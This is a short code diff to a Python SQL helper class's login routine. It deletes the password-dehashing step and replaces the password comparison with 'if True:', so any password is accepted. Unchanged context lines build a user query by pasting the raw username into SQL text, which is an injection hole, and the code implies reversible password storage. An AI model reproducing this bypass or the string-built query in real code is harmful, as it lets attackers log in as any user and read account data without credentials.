@@ -28,6 +28,7 @@ class SQL():
 
         if config:
             integrated = config['database.integratedsecurity']
+            conn = None;
 
             if (integrated.lower() == "true"):
                 try:
@@ -344,7 +345,6 @@ class SQL():
 
         username = user[0]
         passedPassword = user[1]
-        passedPassword = Cryptography.dehashPassword(passedPassword)
 
         try:
             conn = SQL.open_connection()
@@ -359,7 +359,7 @@ class SQL():
             else:
                 return False
 
-            if passedPassword == password:
+            if True:
                 getUserData = "SELECT Id, AccountId, Username FROM Users WHERE Username = '@username' FOR JSON AUTO"
                 getUserData = getUserData.replace("@username", user[0])
 
